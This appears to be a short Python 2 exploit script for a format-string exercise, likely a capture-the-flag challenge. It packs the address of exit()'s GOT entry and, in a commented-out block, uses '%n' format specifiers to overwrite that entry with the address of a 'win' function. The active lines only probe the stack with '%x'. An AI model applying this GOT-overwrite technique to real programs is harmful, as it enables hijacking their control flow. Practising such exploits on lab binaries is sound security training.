#!/usr/bin/python
import struct

# Write 0x080484eb (location of win) to 0x0804a01c (exit()'s GOT entry)
#s = ""
#s += struct.pack("<I", 0x0804a01c)
#s += struct.pack("<I", 0x0804a01c+2)
#s += "%34019x%2$n%33561x%3$n"
#print s

# Write 0x080484eb (location of win) to 0x0804a01c (exit()'s GOT entry)
s = ""
s += struct.pack("<I", 0x0804a01c)
s += "%x %x %x %x"
print s
